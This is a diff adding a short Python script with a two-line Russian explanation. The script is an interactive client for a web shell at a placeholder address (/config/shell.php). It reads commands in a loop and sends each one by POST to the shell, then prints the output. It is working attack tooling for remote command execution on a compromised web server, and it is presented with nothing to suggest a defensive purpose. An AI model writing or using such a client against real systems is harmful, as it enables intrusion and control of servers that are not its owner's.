@@ -1,0 +1,15 @@
+import requests
+
+BASE_URL = "https://URL/config/shell.php"
+
+def cmd(c):
+    print(requests.post(BASE_URL, data={'c': c}).text)
+
+while True:
+    c = input("$ ").strip()
+    if c in ('exit','quit'): break
+    cmd(c)
+
+
+requests.post(BASE_URL, data={'c': c}) — отправляет POST-запрос к веб-шеллу. 
+В теле запроса (поле data) передаётся словарь {'c': c}, где c — та команда, которую мы ввели.
